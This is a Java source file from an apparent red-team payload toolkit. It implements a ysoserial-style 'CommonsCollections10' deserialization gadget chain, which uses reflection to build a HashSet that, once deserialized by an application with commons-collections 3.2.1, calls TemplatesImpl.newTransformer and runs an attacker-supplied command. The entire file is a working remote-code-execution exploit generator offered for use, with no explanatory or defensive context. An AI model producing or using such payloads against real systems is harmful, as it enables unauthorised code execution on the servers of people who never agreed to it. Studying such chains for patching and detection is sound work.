package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({Authors.WH1T3P1G})
public class CommonsCollections10 extends PayloadRunner implements ObjectPayload<HashSet> {

    @Override
    public HashSet getObject(final String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);

        HashSet map = new HashSet(1);
        map.add("foo");

        Field mapField;
        try {
            mapField = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            mapField = HashSet.class.getDeclaredField("backingMap");
        }
        Reflections.setAccessible(mapField);
        HashMap backingMap = (HashMap) mapField.get(map);

        Field tableField;
        try {
            tableField = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            tableField = HashMap.class.getDeclaredField("elementData");
        }
        Reflections.setAccessible(tableField);
        Object[] array = (Object[]) tableField.get(backingMap);
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return map;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections10.class, args);
    }
}
